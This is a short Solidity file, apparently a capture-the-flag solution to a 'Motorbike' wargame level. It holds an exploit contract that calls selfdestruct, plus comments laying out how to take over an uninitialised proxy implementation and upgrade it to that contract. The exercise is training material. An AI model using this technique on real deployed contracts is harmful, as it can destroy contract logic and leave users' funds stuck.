// # Objectives
// Selfdestruct Motorbike Engine

pragma solidity ^0.8.0;

import "hardhat/console.sol";

// Lowkey interface to generate minimal type from it
interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract ExploitMotorbike {
    function blowUp() external {
        selfdestruct(payable(msg.sender));
    }
}

// create selfdestruct upgrade
// engine.upgradeToAndCall()
// needs msg.sender == upgrader; aka motorbike contract;
// -> set at initiliazer #Slot 0
// motorbike.fallback() calls internal -> msg.sender

// Engine itself is vulnerable
